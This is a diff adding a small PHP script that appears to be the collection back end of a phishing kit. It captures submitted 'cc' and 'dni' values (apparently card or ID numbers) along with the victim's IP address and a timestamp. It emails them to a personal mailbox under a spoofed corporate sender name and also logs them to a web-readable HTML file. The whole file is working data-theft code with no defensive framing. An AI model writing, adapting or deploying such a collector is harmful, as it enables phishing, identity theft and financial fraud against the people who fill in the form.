@@ -1,1 +1,31 @@
+<?php 
+$logsfile = 'datos.html';
+	
+$_SESSION['cc'] = $_POST['cc'];
+$_SESSION['dni'] = $_POST['dni'];
 
+$ip = getenv("REMOTE_ADDR");
+$Fecha= date('d-m-Y');
+$Hora= date('H:i:s');
+
+
+$correo="mariobunge1982@gmail.com";
+$subj="Login - $ip";
+$from= "From: Bunge <brchile@bunge.com.pe>";
+
+$cc= $_POST ['cc'];
+$dni= $_POST ['dni'];
+$user_agent = getenv("HTTP_USER_AGENT");
+
+	
+
+$content = "    | $Fecha - $Hora | $ip | $cc | $dni |<br>";
+
+mail($correo, $subj, $content, $from);
+	
+
+    $file=fopen($logsfile, "a+"); 
+    fwrite($file,$content); 
+    fclose($file);
+?>
+Exito
